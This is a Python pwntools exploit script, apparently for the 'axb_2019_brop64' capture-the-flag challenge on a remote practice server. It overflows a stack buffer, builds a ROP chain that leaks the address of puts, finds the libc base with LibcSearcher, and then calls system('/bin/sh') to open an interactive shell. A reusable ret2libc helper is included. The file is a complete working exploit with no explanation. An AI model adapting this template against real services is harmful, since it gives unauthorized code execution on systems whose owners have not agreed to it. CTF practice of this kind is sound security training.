from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun='', path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './axb_2019_brop64'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26497) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()

#ret2libc
pop_rdi_ret = 0x0400963
main_addr = 0x400845
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

#get libc base
ru(b'Please tell me:')
payload = b'a'* (0xd0+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
s(payload)
puts_addr = uu64(ru(b'\x7f',drop=False)[-6:])
log.success('puts_addr',hex(puts_addr))
base, system_addr, bin_sh_addr = ret2libc(puts_addr,'puts')

#attack

ru(b'Please tell me:')
payload = b'a'* (0xd0+8) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)
s(payload)
itr()

